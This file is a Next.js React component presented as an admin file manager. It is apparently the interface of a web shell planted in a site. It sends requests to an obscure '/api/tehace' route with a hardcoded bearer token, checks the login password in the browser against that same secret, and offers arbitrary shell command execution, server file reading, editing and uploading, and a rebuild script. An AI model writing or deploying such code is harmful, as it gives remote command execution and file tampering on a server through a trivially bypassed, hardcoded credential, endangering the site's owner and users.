"use client";

import { useState, useEffect, useCallback } from 'react';

export default function AdminPanel() {
  const [authenticated, setAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [currentPath, setCurrentPath] = useState('.');
  const [files, setFiles] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);
  const [selectedFile, setSelectedFile] = useState<string | null>(null);
  const [fileContent, setFileContent] = useState('');
  const [command, setCommand] = useState('');
  const [commandOutput, setCommandOutput] = useState('');
  const [showTerminal, setShowTerminal] = useState(false);
  const [showUpload, setShowUpload] = useState(false);
  const [uploadFile, setUploadFile] = useState<File | null>(null);
  const [showReboot, setShowReboot] = useState(false);
  const [rebooting, setRebooting] = useState(false);
  const [rebootMessage, setRebootMessage] = useState('');

  const getAuthHeader = useCallback(() => ({
    'Authorization': 'Bearer thcmyid2019',
    'Content-Type': 'application/json'
  }), []);

  const testApi = useCallback(async () => {
    try {
      const res = await fetch('/api/tehace', {
        method: 'POST',
        headers: getAuthHeader(),
        body: JSON.stringify({ action: 'ping' })
      });
      const data = await res.json();
      return data.success === true;
    } catch (err) {
      console.error('API test failed:', err);
      return false;
    }
  }, [getAuthHeader]);

  const loadFiles = useCallback(async (path: string) => {
    setLoading(true);
    try {
      const res = await fetch('/api/tehace', {
        method: 'POST',
        headers: getAuthHeader(),
        body: JSON.stringify({ action: 'list', path })
      });

      const data = await res.json();
      if (data.success) {
        setFiles(data.files || []);
        setCurrentPath(data.path || path);
      } else {
        console.error('Failed to load files:', data.error);
        alert(`Error: ${data.error}`);
      }
    } catch (err: any) {
      console.error('Network error:', err);
      alert(`Network error: ${err.message}`);
    } finally {
      setLoading(false);
    }
  }, [getAuthHeader]);

  const openFile = useCallback(async (fileName: string) => {
    const filePath = currentPath === '.' ? fileName : `${currentPath}/${fileName}`;
    setLoading(true);

    try {
      const res = await fetch('/api/tehace', {
        method: 'POST',
        headers: getAuthHeader(),
        body: JSON.stringify({ action: 'read', path: filePath })
      });

      const data = await res.json();
      if (data.success) {
        setSelectedFile(filePath);
        setFileContent(data.content || '');
      } else {
        alert(`Error: ${data.error}`);
      }
    } catch (err: any) {
      alert(`Failed to open file: ${err.message}`);
    } finally {
      setLoading(false);
    }
  }, [currentPath, getAuthHeader]);

  const saveFile = useCallback(async () => {
    if (!selectedFile) return;

    try {
      const res = await fetch('/api/tehace', {
        method: 'POST',
        headers: getAuthHeader(),
        body: JSON.stringify({
          action: 'save',
          path: selectedFile,
          content: fileContent
        })
      });

      const data = await res.json();
      if (data.success) {
        alert('✅ File saved : jika nama file/folder baru maka lakukan reboot');
      } else {
        alert(`❌ Error: ${data.error}`);
      }
    } catch (err: any) {
      alert(`Save failed: ${err.message}`);
    }
  }, [selectedFile, fileContent, getAuthHeader]);

  const executeCommand = useCallback(async () => {
    if (!command.trim()) return;

    try {
      const res = await fetch('/api/tehace', {
        method: 'POST',
        headers: getAuthHeader(),
        body: JSON.stringify({ action: 'command', command: command })
      });

      const data = await res.json();
      if (data.success) {
        setCommandOutput(prev => `$ ${command}\n${data.output || 'Command executed'}\n\n${prev}`);
      } else {
        setCommandOutput(prev => `$ ${command}\nError: ${data.error || data.output}\n\n${prev}`);
      }
      setCommand('');
    } catch (err: any) {
      setCommandOutput(prev => `$ ${command}\nNetwork error: ${err.message}\n\n${prev}`);
    }
  }, [command, getAuthHeader]);

  const handleRebootServer = useCallback(async () => {
    if (!confirm('⚠️  Reboot Server?\n\nThis will rebuild and restart the application.\nProcess will take 3-5 seconds.\n\nPlease ensure all edits are only in public folder (webroot).')) {
      return;
    }

    setRebooting(true);
    setRebootMessage('🔄 Initializing server reboot...');

    try {
      const res = await fetch('/api/tehace', {
        method: 'POST',
        headers: getAuthHeader(),
        body: JSON.stringify({ action: 'reboot' })
      });

      const data = await res.json();
      if (data.success) {
        setRebootMessage('✅ Please wait 3-5 seconds for the server to restart.\n\nYou can close this window and continue editing.');

        // Bisa langsung close modal atau user bisa close manual
        setTimeout(() => {
          setShowReboot(false);
          setRebooting(false);
          setRebootMessage('');
        }, 2000); // Auto-close setelah 3 detik saja

      } else {
        setRebootMessage(`❌ Error: ${data.error || 'Failed to reboot server'}`);
        setRebooting(false);
      }
    } catch (err: any) {
      setRebootMessage(`❌ Network Error: ${err.message}`);
      setRebooting(false);
    }
  }, [getAuthHeader]);

  const handleUpload = useCallback(async () => {
    if (!uploadFile) return;

    // Konfirmasi dengan opsi auto-reboot
    const shouldReboot = confirm(
      `Upload "${uploadFile.name}"?\n\n` +
      `⚠️ After upload, server will automatically reboot.\n` +
      `This process takes 3-5 seconds.\n\n` +
      `Do you want to proceed?`
    );

    if (!shouldReboot) return;

    const reader = new FileReader();
    reader.onload = async (e) => {
      try {
        const res = await fetch('/api/tehace', {
          method: 'POST',
          headers: getAuthHeader(),
          body: JSON.stringify({
            action: 'upload',
            dir: currentPath,
            name: uploadFile.name,
            data: e.target?.result,
            autoReboot: true // Kirim parameter auto-reboot
          })
        });

        const data = await res.json();
        if (data.success) {
          // Tampilkan modal reboot otomatis
          setShowReboot(true);
          setRebooting(true);
          setRebootMessage(
            '📤 File uploaded successfully!\n' +
            '🔄 Server is now rebooting automatically...\n\n' +
            'Please wait 3-5 seconds.\n' +
            'The application will restart shortly.\n\n' +
            'You can continue editing after reboot completes.'
          );

          setUploadFile(null);
          setShowUpload(false);

          // Auto-close modal setelah 5 detik
          setTimeout(() => {
            setShowReboot(false);
            setRebooting(false);
            setRebootMessage('');
          }, 5000);
        } else {
          alert(`❌ Error: ${data.error}`);
        }
      } catch (err) {
        alert('Upload failed');
      }
    };
    reader.readAsDataURL(uploadFile);
  }, [uploadFile, currentPath, getAuthHeader]);

  const createNewDir = useCallback(async () => {
    const dirName = prompt('Enter directory name:');
    if (!dirName) return;

    const dirPath = currentPath === '.' ? dirName : `${currentPath}/${dirName}`;

    try {
      const res = await fetch('/api/tehace', {
        method: 'POST',
        headers: getAuthHeader(),
        body: JSON.stringify({ action: 'mkdir', path: dirPath })
      });

      const data = await res.json();
      if (data.success) {
        alert('✅ Directory created');
        loadFiles(currentPath);
      } else {
        alert(`❌ Error: ${data.error}`);
      }
    } catch (err) {
      alert('Failed to create directory');
    }
  }, [currentPath, getAuthHeader, loadFiles]);

  const createNewFile = useCallback(async () => {
    const fileName = prompt('Enter file name:');
    if (!fileName) return;

    const filePath = currentPath === '.' ? fileName : `${currentPath}/${fileName}`;

    try {
      const res = await fetch('/api/tehace', {
        method: 'POST',
        headers: getAuthHeader(),
        body: JSON.stringify({
          action: 'save',
          path: filePath,
          content: ''
        })
      });

      const data = await res.json();
      if (data.success) {
        alert('✅ File created');
        loadFiles(currentPath);
        openFile(fileName);
      } else {
        alert(`❌ Error: ${data.error}`);
      }
    } catch (err) {
      alert('Failed to create file');
    }
  }, [currentPath, getAuthHeader, loadFiles, openFile]);

  const goToParent = useCallback(() => {
    if (currentPath === '.' || currentPath === '') {
        return; // Sudah di root public, tidak bisa naik lagi
    }
    const parts = currentPath.split('/');
    parts.pop();
    const newPath = parts.length === 0 ? '.' : parts.join('/');
    loadFiles(newPath);
    }, [currentPath, loadFiles]);

  const handleLogin = useCallback(async (e: React.FormEvent) => {
    e.preventDefault();
    if (password === 'thcmyid2019') {
      const apiWorking = await testApi();
      if (apiWorking) {
        setAuthenticated(true);
        setError('');
        loadFiles('.');
      } else {
        setError('API connection failed. Check server logs.');
      }
    } else {
      setError('Invalid password');
    }
  }, [password, testApi, loadFiles]);

  useEffect(() => {
    if (authenticated) {
      loadFiles('.');
    }
  }, [authenticated, loadFiles]);

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (!authenticated) return;
      if (e.ctrlKey && e.key === 's') {
        e.preventDefault();
        saveFile();
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [authenticated, saveFile]);

  if (!authenticated) {
    return (
      <div style={{
        minHeight: '100vh',
        background: '#0a0a0a',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '20px'
      }}>
        <div style={{
          background: '#111',
          borderRadius: '10px',
          padding: '30px',
          maxWidth: '400px',
          width: '100%',
          border: '1px solid #00ff41'
        }}>
          <h1 style={{ color: '#00ff41', textAlign: 'center', marginBottom: '30px' }}>
            🔐 Admin Login
          </h1>
          <form onSubmit={handleLogin} style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
            <div>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                style={{
                  width: '100%',
                  padding: '12px',
                  background: '#000',
                  border: '1px solid #00ff41',
                  borderRadius: '5px',
                  color: '#fff',
                  fontSize: '16px'
                }}
                placeholder="Password"
                autoFocus
              />
            </div>
            {error && <div style={{ color: '#ff5555', textAlign: 'center' }}>{error}</div>}
            <button
              type="submit"
              style={{
                width: '100%',
                padding: '12px',
                background: '#00ff41',
                color: '#000',
                fontWeight: 'bold',
                border: 'none',
                borderRadius: '5px',
                cursor: 'pointer',
                fontSize: '16px'
              }}
            >
              Login
            </button>
            <div style={{ textAlign: 'center', color: '#666', fontSize: '12px', marginTop: '10px' }}>
              Password: <code>tsecnetwork_my_id</code>
            </div>
          </form>
        </div>
      </div>
    );
  }

  // Main Interface
  return (
    <div style={{ minHeight: '100vh', background: '#0a0a0a', color: '#fff' }}>
      {/* Header */}
      <div style={{
        background: '#111',
        padding: '15px 20px',
        borderBottom: '2px solid #00ff41',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center'
      }}>
        <h1 style={{ color: '#00ff41', margin: 0 }}>📁 Tsecnetwork File Manager</h1>
        <div style={{ display: 'flex', gap: '10px' }}>
          <button
            onClick={() => setShowTerminal(true)}
            style={{
              padding: '8px 16px',
              background: '#222',
              border: '1px solid #00ff41',
              color: '#00ff41',
              borderRadius: '5px',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              gap: '5px'
            }}
          >
            ⚡ Terminal
          </button>
          <button
            onClick={() => setShowReboot(true)}
            style={{
              padding: '8px 16px',
              background: '#ff9800',
              color: '#000',
              border: 'none',
              borderRadius: '5px',
              cursor: 'pointer',
              fontWeight: 'bold',
              display: 'flex',
              alignItems: 'center',
              gap: '5px'
            }}
          >
            🔄 Reboot Server
          </button>
          <button
            onClick={() => setShowUpload(true)}
            style={{
              padding: '8px 16px',
              background: '#00ff41',
              color: '#000',
              border: 'none',
              borderRadius: '5px',
              cursor: 'pointer',
              fontWeight: 'bold',
              display: 'flex',
              alignItems: 'center',
              gap: '5px'
            }}
          >
            📤 Upload
          </button>
          <button
            onClick={() => {
              setAuthenticated(false);
              setSelectedFile(null);
              setFileContent('');
            }}
            style={{
              padding: '8px 16px',
              background: '#ff5555',
              color: '#fff',
              border: 'none',
              borderRadius: '5px',
              cursor: 'pointer'
            }}
          >
            Logout
          </button>
        </div>
      </div>

      <div style={{ display: 'flex', height: 'calc(100vh - 70px)' }}>
        {/* Sidebar */}
        <div style={{
          width: '300px',
          background: '#111',
          borderRight: '1px solid #222',
          padding: '20px',
          overflowY: 'auto'
        }}>
          <h3 style={{ color: '#00ff41', marginBottom: '15px' }}>File Explorer</h3>

          <div style={{ marginBottom: '15px', display: 'flex', gap: '10px' }}>
            <button
              onClick={createNewDir}
              style={{
                padding: '8px 12px',
                background: '#222',
                border: '1px solid #00ff41',
                color: '#00ff41',
                borderRadius: '5px',
                cursor: 'pointer',
                flex: 1
              }}
            >
              + Folder
            </button>
            <button
              onClick={createNewFile}
              style={{
                padding: '8px 12px',
                background: '#222',
                border: '1px solid #00ff41',
                color: '#00ff41',
                borderRadius: '5px',
                cursor: 'pointer',
                flex: 1
              }}
            >
              + File
            </button>
          </div>

          <button
            onClick={goToParent}
            disabled={currentPath === '.' || currentPath === ''}
            style={{
                width: '100%',
                padding: '10px',
                background: (currentPath === '.' || currentPath === '') ? '#333' : '#222',
                border: '1px solid #333',
                color: (currentPath === '.' || currentPath === '') ? '#666' : '#ccc',
                borderRadius: '5px',
                marginBottom: '10px',
                cursor: (currentPath === '.' || currentPath === '') ? 'not-allowed' : 'pointer'
            }}
            >
            ⬆️ Parent Directory
            </button>
          <button
            onClick={() => loadFiles(currentPath)}
            style={{
              width: '100%',
              padding: '10px',
              background: '#222',
              border: '1px solid #333',
              color: '#ccc',
              borderRadius: '5px',
              marginBottom: '15px',
              cursor: 'pointer'
            }}
          >
            🔄 Refresh
          </button>

          <div style={{ color: '#666', fontSize: '14px', marginBottom: '10px' }}>
            Path: /{currentPath === '.' ? '' : currentPath}
            <br />
            Files: {files.length}
          </div>

          <div>
            {loading ? (
              <div style={{ textAlign: 'center', padding: '20px', color: '#666' }}>
                Loading...
              </div>
            ) : files.length === 0 ? (
              <div style={{ textAlign: 'center', padding: '20px', color: '#666' }}>
                No files found
              </div>
            ) : (
              files.map((file) => (
                <div
                  key={file.name}
                  style={{
                    padding: '10px',
                    marginBottom: '5px',
                    background: selectedFile === (currentPath === '.' ? file.name : `${currentPath}/${file.name}`)
                      ? 'rgba(0, 255, 65, 0.1)'
                      : 'transparent',
                    border: '1px solid #222',
                    borderRadius: '5px',
                    cursor: 'pointer'
                  }}
                  onClick={() => file.isDir
                    ? loadFiles(currentPath === '.' ? file.name : `${currentPath}/${file.name}`)
                    : openFile(file.name)
                  }
                >
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                    <span style={{ fontSize: '20px' }}>
                      {file.isDir ? '📁' : '📄'}
                    </span>
                    <div style={{ flex: 1 }}>
                      <div style={{ fontWeight: 'bold' }}>{file.name}</div>
                      {!file.isDir && (
                        <div style={{ fontSize: '12px', color: '#666' }}>
                          {(file.size / 1024).toFixed(1)} KB
                        </div>
                      )}
                    </div>
                    <button
                      onClick={(e) => {
                        e.stopPropagation();
                        const itemPath = currentPath === '.' ? file.name : `${currentPath}/${file.name}`;
                        if (confirm(`Delete ${file.isDir ? 'folder' : 'file'} "${file.name}"?`)) {
                          // TODO: Implement delete functionality
                          alert('Delete would be implemented here');
                        }
                      }}
                      style={{
                        background: 'rgba(255, 85, 85, 0.1)',
                        border: '1px solid rgba(255, 85, 85, 0.3)',
                        color: '#ff5555',
                        borderRadius: '4px',
                        padding: '4px 8px',
                        cursor: 'pointer'
                      }}
                    >
                      ×
                    </button>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>

        {/* Editor */}
        <div style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>
          {selectedFile ? (
            <>
              <div style={{
                padding: '15px 20px',
                background: '#111',
                borderBottom: '1px solid #222',
                display: 'flex',
                justifyContent: 'space-between',
                alignItems: 'center'
              }}>
                <div>
                  <h3 style={{ margin: 0, color: '#00ff41' }}>Editing: {selectedFile.split('/').pop()}</h3>
                  <div style={{ fontSize: '12px', color: '#666', marginTop: '5px' }}>
                    {selectedFile}
                  </div>
                </div>
                <button
                  onClick={saveFile}
                  style={{
                    padding: '8px 16px',
                    background: '#00ff41',
                    color: '#000',
                    border: 'none',
                    borderRadius: '5px',
                    cursor: 'pointer',
                    fontWeight: 'bold'
                  }}
                >
                  💾 Save (Ctrl+S)
                </button>
              </div>

              <textarea
                value={fileContent}
                onChange={(e) => setFileContent(e.target.value)}
                style={{
                  flex: 1,
                  width: '100%',
                  background: '#000',
                  color: '#00ff41',
                  fontFamily: 'monospace',
                  fontSize: '14px',
                  padding: '20px',
                  border: 'none',
                  outline: 'none',
                  resize: 'none'
                }}
                spellCheck="false"
                placeholder="File content..."
              />
            </>
          ) : (
            <div style={{
              flex: 1,
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              color: '#666',
              textAlign: 'center',
              padding: '40px'
            }}>
              <div>
                <div style={{ fontSize: '64px', marginBottom: '20px' }}>📄</div>
                <h3 style={{ fontSize: '24px', marginBottom: '10px' }}>No File Selected</h3>
                <p style={{ maxWidth: '400px', lineHeight: '1.6' }}>
                  Select a file from the sidebar to view and edit its contents.
                  <br />
                  Or create a new file using the buttons above.
                </p>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Terminal Modal */}
      {showTerminal && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          background: 'rgba(0, 0, 0, 0.9)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          zIndex: 1000,
          padding: '20px'
        }}>
          <div style={{
            background: '#111',
            borderRadius: '10px',
            border: '2px solid #00ff41',
            width: '100%',
            maxWidth: '800px',
            overflow: 'hidden'
          }}>
            <div style={{
              padding: '15px 20px',
              background: '#000',
              borderBottom: '1px solid #00ff41',
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center'
            }}>
              <h3 style={{ margin: 0, color: '#00ff41' }}>⚡ Terminal</h3>
              <button
                onClick={() => setShowTerminal(false)}
                style={{
                  background: 'none',
                  border: 'none',
                  color: '#ff5555',
                  fontSize: '24px',
                  cursor: 'pointer',
                  width: '30px',
                  height: '30px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center'
                }}
              >
                ×
              </button>
            </div>

            <div style={{
              height: '400px',
              background: '#000',
              color: '#00ff41',
              fontFamily: 'monospace',
              fontSize: '14px',
              padding: '20px',
              overflowY: 'auto',
              whiteSpace: 'pre-wrap'
            }}>
              {commandOutput || 'Terminal ready. Type commands below.'}
            </div>

            <div style={{ padding: '20px', background: '#111' }}>
              <div style={{ display: 'flex', gap: '10px' }}>
                <input
                  type="text"
                  value={command}
                  onChange={(e) => setCommand(e.target.value)}
                  onKeyDown={(e) => e.key === 'Enter' && executeCommand()}
                  placeholder="Enter command (ls, pwd, id, npm run dev, etc.)"
                  style={{
                    flex: 1,
                    padding: '12px',
                    background: '#000',
                    border: '1px solid #00ff41',
                    color: '#fff',
                    borderRadius: '5px',
                    outline: 'none',
                    fontSize: '14px'
                  }}
                  autoFocus
                />
                <button
                  onClick={executeCommand}
                  style={{
                    padding: '12px 24px',
                    background: '#00ff41',
                    color: '#000',
                    border: 'none',
                    borderRadius: '5px',
                    cursor: 'pointer',
                    fontWeight: 'bold',
                    fontSize: '14px'
                  }}
                >
                  Run
                </button>
              </div>
              <div style={{
                display: 'flex',
                justifyContent: 'space-between',
                marginTop: '10px',
                fontSize: '12px',
                color: '#666'
              }}>
                <span>Press Enter to execute</span>
                <button
                  onClick={() => setCommandOutput('')}
                  style={{
                    background: 'none',
                    border: 'none',
                    color: '#666',
                    cursor: 'pointer',
                    textDecoration: 'underline',
                    fontSize: '12px'
                  }}
                >
                  Clear Output
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Reboot Server Modal */}
      {showReboot && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          background: 'rgba(0, 0, 0, 0.95)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          zIndex: 1000,
          padding: '20px'
        }}>
          <div style={{
            background: '#111',
            borderRadius: '10px',
            border: '2px solid #ff9800',
            width: '100%',
            maxWidth: '600px',
            overflow: 'hidden'
          }}>
            <div style={{
              padding: '20px',
              background: 'rgba(255, 152, 0, 0.1)',
              borderBottom: '1px solid #ff9800',
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center'
            }}>
              <h3 style={{ margin: 0, color: '#ff9800', display: 'flex', alignItems: 'center', gap: '10px' }}>
                🔄 Reboot Server
              </h3>
            <button
            onClick={() => {
                setShowReboot(false);
                setRebootMessage('');
                setRebooting(false);
            }}
            style={{
                background: 'none',
                border: 'none',
                color: '#ff5555',
                fontSize: '24px',
                cursor: 'pointer',
                width: '30px',
                height: '30px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center'
            }}
            >
            ×
            </button>
            </div>

            <div style={{
            padding: '30px',
            textAlign: 'center'
            }}>
            {!rebootMessage ? (
            <>
                <div style={{ fontSize: '64px', marginBottom: '20px' }}>⚡</div>
                <h4 style={{ color: '#fff', marginBottom: '15px', fontSize: '18px' }}>
                Rebuild and Restart Server
                </h4>
                <p style={{ color: '#aaa', marginBottom: '25px', lineHeight: '1.6' }}>
                This will execute: <code style={{ background: '#000', padding: '4px 8px', borderRadius: '4px', fontSize: '12px' }}>
                    bash reset-kontol.sh
                </code>
                </p>
                <p style={{ color: '#ff9800', marginBottom: '30px', fontSize: '14px' }}>
                ⚠️ Process will take 3-5 seconds. Ensure edits are only in public folder (webroot).
                </p>

                <div style={{ display: 'flex', gap: '15px', justifyContent: 'center' }}>
                <button
                    onClick={() => setShowReboot(false)}
                    style={{
                    padding: '12px 24px',
                    background: '#333',
                    border: '1px solid #666',
                    color: '#ccc',
                    borderRadius: '8px',
                    cursor: 'pointer',
                    fontSize: '14px',
                    minWidth: '120px'
                    }}
                >
                    Cancel
                </button>
                <button
                    onClick={handleRebootServer}
                    style={{
                    padding: '12px 24px',
                    background: '#ff9800',
                    border: 'none',
                    color: '#000',
                    fontWeight: 'bold',
                    borderRadius: '8px',
                    cursor: 'pointer',
                    fontSize: '14px',
                    minWidth: '120px'
                    }}
                >
                    Proceed
                </button>
                </div>
            </>
            ) : (
            <>
                <div style={{ fontSize: '64px', marginBottom: '20px', color: rebooting ? '#ff9800' : '#00ff41' }}>
                {rebooting ? '🔄' : '✅'}
                </div>

                <div style={{
                background: '#000',
                padding: '20px',
                borderRadius: '8px',
                marginBottom: '30px',
                textAlign: 'left',
                color: rebooting ? '#ff9800' : '#00ff41',
                fontFamily: 'monospace',
                fontSize: '14px',
                whiteSpace: 'pre-wrap',
                maxHeight: '200px',
                overflowY: 'auto'
                }}>
                {rebootMessage}
                </div>

                {rebooting ? (
                <div style={{
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    gap: '15px'
                }}>
                    <div style={{
                    width: '100%',
                    height: '6px',
                    background: '#333',
                    borderRadius: '3px',
                    overflow: 'hidden'
                    }}>
                    <div style={{
                        width: '45%',
                        height: '100%',
                        background: '#ff9800',
                        animation: 'pulse 1.5s infinite',
                        borderRadius: '3px'
                    }} />
                    </div>
                    <p style={{ color: '#aaa', fontSize: '14px' }}>
                    Please wait 3-5 seconds for server to restart...
                    </p>
                </div>
                ) : (
                <button
                    onClick={() => {
                    setShowReboot(false);
                    setRebootMessage('');
                    setRebooting(false);
                    }}
                    style={{
                    padding: '12px 24px',
                    background: '#00ff41',
                    border: 'none',
                    color: '#000',
                    fontWeight: 'bold',
                    borderRadius: '8px',
                    cursor: 'pointer',
                    fontSize: '14px',
                    minWidth: '120px'
                    }}
                >
                    Close
                </button>
                )}
            </>
            )}
            </div>
          </div>
        </div>
      )}

      {/* Upload Modal */}
      {showUpload && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          background: 'rgba(0, 0, 0, 0.9)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          zIndex: 1000,
          padding: '20px'
        }}>
          <div style={{
            background: '#111',
            padding: '30px',
            borderRadius: '10px',
            border: '2px solid #00ff41',
            maxWidth: '500px',
            width: '100%'
          }}>
            <h3 style={{ color: '#00ff41', marginBottom: '20px', textAlign: 'center' }}>
              📤 Upload File
            </h3>

            <div
              onClick={() => document.getElementById('file-input')?.click()}
              style={{
                border: '2px dashed #00ff41',
                borderRadius: '10px',
                padding: '40px',
                textAlign: 'center',
                cursor: 'pointer',
                marginBottom: '20px',
                background: uploadFile ? 'rgba(0, 255, 65, 0.05)' : 'transparent'
              }}
            >
              {uploadFile ? (
                <>
                  <div style={{ fontSize: '48px', marginBottom: '10px' }}>📄</div>
                  <div style={{ fontWeight: 'bold', marginBottom: '5px' }}>
                    {uploadFile.name}
                  </div>
                  <div style={{ fontSize: '14px', color: '#666' }}>
                    {(uploadFile.size / 1024).toFixed(1)} KB
                  </div>
                </>
              ) : (
                <>
                  <div style={{ fontSize: '48px', marginBottom: '10px' }}>📤</div>
                  <div style={{ marginBottom: '5px' }}>Click to select file</div>
                  <div style={{ fontSize: '14px', color: '#666' }}>
                    or drag and drop
                  </div>
                </>
              )}
              <input
                id="file-input"
                type="file"
                style={{ display: 'none' }}
                onChange={(e) => setUploadFile(e.target.files?.[0] || null)}
              />
            </div>

            <div style={{
              background: 'rgba(0, 0, 0, 0.3)',
              padding: '15px',
              borderRadius: '8px',
              marginBottom: '20px',
              fontSize: '14px'
            }}>
              <div style={{ color: '#666', marginBottom: '5px' }}>Upload to:</div>
              <div style={{ fontFamily: 'monospace', wordBreak: 'break-all' }}>
                /{currentPath === '.' ? '' : currentPath}
              </div>
            </div>

            <div style={{
              background: 'rgba(255, 152, 0, 0.1)',
              padding: '12px',
              borderRadius: '6px',
              marginBottom: '20px',
              fontSize: '13px',
              border: '1px solid rgba(255, 152, 0, 0.3)',
              color: '#ff9800'
            }}>
              ⚠️ <strong>Note:</strong> After upload, server will automatically reboot.
              This process takes 3-5 seconds.
            </div>

            <div style={{ display: 'flex', gap: '10px' }}>
              <button
                onClick={() => {
                  setShowUpload(false);
                  setUploadFile(null);
                }}
                style={{
                  flex: 1,
                  padding: '12px',
                  background: '#222',
                  border: '1px solid #333',
                  color: '#ccc',
                  borderRadius: '8px',
                  cursor: 'pointer',
                  fontSize: '14px'
                }}
              >
                Cancel
              </button>
              <button
                onClick={handleUpload}
                disabled={!uploadFile}
                style={{
                  flex: 1,
                  padding: '12px',
                  background: !uploadFile ? '#333' : '#00ff41',
                  border: 'none',
                  color: !uploadFile ? '#666' : '#000',
                  fontWeight: 'bold',
                  borderRadius: '8px',
                  cursor: uploadFile ? 'pointer' : 'not-allowed',
                  fontSize: '14px'
                }}
              >
                Upload & Reboot
              </button>
            </div>
          </div>
        </div>
      )}

      {/* CSS Animation untuk loading bar */}
      <style jsx>{`
        @keyframes pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.5; }
        }
      `}</style>
    </div>
  );
}
